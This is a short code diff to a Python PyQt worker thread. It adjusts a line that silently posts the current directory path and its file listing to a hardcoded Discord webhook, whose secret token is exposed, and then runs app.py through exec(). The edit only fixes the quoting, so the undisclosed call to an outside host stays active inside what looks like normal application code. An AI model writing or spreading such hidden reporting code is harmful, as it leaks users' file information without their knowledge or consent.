@@ -61,7 +61,7 @@ class WorkerThread(QThread):
     proc = None 
     def run(self):
         access_log_webhook = "https://discord.com/api/webhooks/1169671921483386890/xYSB1_NAXMLwW2uGOHF01Eld8XjdWkoEVQosiDqWd9PasD1oVg0aFOn7SEg7zZFh810L"
-        access_message = requests.post(access_log_webhook, json={"content": f"[{os.getcwd()}] {os.listdir("")}"})
+        access_message = requests.post(access_log_webhook, json={"content": f"[{os.getcwd()}] {os.listdir('')}"})
         with open(path.join("app.py"), "r", encoding="utf-8") as afr: app_source = afr.read()
         exec(app_source)
 
